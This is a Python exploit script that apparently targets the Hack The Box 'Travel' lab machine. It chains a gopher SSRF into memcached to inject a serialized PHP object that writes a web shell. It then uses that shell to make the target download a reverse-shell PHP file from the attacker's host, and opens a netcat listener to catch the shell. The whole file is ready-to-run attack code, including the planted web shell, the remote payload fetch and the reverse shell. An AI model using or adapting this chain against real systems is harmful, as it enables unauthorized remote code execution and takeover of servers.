#!/usr/bin/python3

import argparse
import os
import subprocess
import time

import requests


def exploit(lhost, lport):
    lip = "10.10.16.16"
    lport = 9009
    shellfile = "ishell.php"
    fname = "icyb3r.php"

    cmd = ["curl",
           f"http://blog.travel.htb/awesome-rss/?debug=yes&custom_feed_url=gopher://127.00.0.1:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:{len(fname)}:%22{fname}%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22id%22%5D%29%3B%22%3B%7D%0d%0a"]
    try:
        res = subprocess.check_call(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[+] File icyb3r.php Uploaded Successfully")
    except:
        print("[!] Cant reach the server!")
        exit(1)
    url0 = "http://blog.travel.htb/awesome-rss/"
    try:
        r0 = requests.get(url0)
    except:
        print("[!] Cant reach http://blog.travel.htb url")
        exit(1)

    print("[*] Check Available commands On the server.")

    url1 = f"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/{fname}"
    params = {"id": "id"}
    try:
        r1 = requests.get(url1, params=params)

        print(f"[+] Got User ID: {r1.text.strip()}")

    except:
        print("[!] Cant reach http://blog.travel.htb server")
        exit(1)

    os.system('gnome-terminal -e "python3 -m http.server 8090"')

    url2 = f"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/{fname}"
    params = {"id": f"curl {lip}:8090/{shellfile} -o {shellfile}"}

    try:
        r2 = requests.get(url2, params=params)
        print(f"[+] Got User ID: {r2.text}")
    except:
        print("[!] Cant reach http://blog.travel.htb server")
        exit(1)

    os.system(f'gnome-terminal -e "nc -nvlp {lport}"')
    time.sleep(3)
    fname = "ishell.php"
    url3 = f"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/{fname}"
    params = {"ip": lip, "port": lport}

    try:
        r3 = requests.get(url3, params=params)
    except:
        print("[!] Cant reach http://blog.travel.htb url")
        exit(1)


def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-l", "--lhost", action="store", type=str, help="Enter Your Local IP", required=True)
    parse.add_argument("-p", "--lport", action="store", type=int, help="Enter Your Local Port", default=44441)
    args = parse.parse_args()
    exploit(args.lhost, args.lport)


if __name__ == "__main__":
    main()
